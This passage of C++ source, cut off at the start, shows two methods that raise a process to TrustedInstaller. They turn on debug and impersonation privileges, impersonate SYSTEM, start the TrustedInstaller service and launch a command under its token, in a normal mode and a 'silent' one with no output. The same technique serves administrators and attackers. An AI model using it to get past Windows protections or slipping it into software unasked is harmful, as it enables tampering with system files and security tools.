    std::wcout << L"Executing with elevated system privileges: " << finalCommandLine << std::endl;
    
    // Enable required privileges
    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeImpersonatePrivilege"); 
    EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");

    // Impersonate SYSTEM to access TrustedInstaller
    if (!ImpersonateSystem())
    {
        std::wcout << L"Failed to impersonate SYSTEM account: " << GetLastError() << std::endl;
        return false;
    }

    // Start TrustedInstaller service
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0)
    {
        std::wcout << L"Failed to start elevated system service: " << GetLastError() << std::endl;
        RevertToSelf();
        return false;
    }

    // Create process with TrustedInstaller privileges
    BOOL result = CreateProcessAsTrustedInstaller(trustedInstallerPid, finalCommandLine.c_str());
    if (!result)
    {
        std::wcout << L"Failed to create process with elevated privileges: " << GetLastError() << std::endl;
    }
    else
    {
        std::wcout << L"Process started successfully with maximum system privileges" << std::endl;
    }

    RevertToSelf();
    return result != FALSE;
}

bool TrustedInstallerIntegrator::RunAsTrustedInstallerSilent(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    // Resolve shortcut if needed
    if (IsLnkFile(commandLine.c_str()))
    {
        finalCommandLine = ResolveLnk(commandLine.c_str());
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    // Enable privileges silently
    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeImpersonatePrivilege");
    EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");

    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstallerSilent(trustedInstallerPid, finalCommandLine.c_str());

    RevertToSelf();
    return result != FALSE;
}